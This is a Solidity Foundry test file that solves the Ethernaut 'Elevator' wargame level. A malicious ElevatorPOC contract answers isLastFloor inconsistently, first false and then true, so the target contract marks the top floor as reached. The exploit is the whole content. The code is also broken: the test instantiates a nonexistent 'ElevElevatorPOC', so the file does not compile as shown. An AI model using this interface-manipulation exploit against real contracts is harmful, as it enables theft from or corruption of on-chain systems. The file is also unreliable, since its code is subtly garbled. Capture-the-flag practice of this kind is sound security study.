// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import "../../src/ethernaut/level1/Elevator.sol";

interface IElevator {
    function goTo(uint256 _floor) external;
}

contract ElevatorPOC {
    uint8 count = 0;

    function attack(address _elevatorAddress) public {
        IElevator elevator = IElevator(_elevatorAddress);
        elevator.goTo(1);
    }
    
    function isLastFloor(uint256 _floor) public returns (bool) {
        count++;
        return count > 1;
    }
  
}

contract Level11 is Test {
    Elevator level11;

    function setUp() public {
        level11 = new Elevator();
    }

    function testExploit() public {
        ElevatorPOC attacker = new ElevElevatorPOC();
        attacker.attack(address(level11));

        console.log("top: ", level11.top());
    }

}
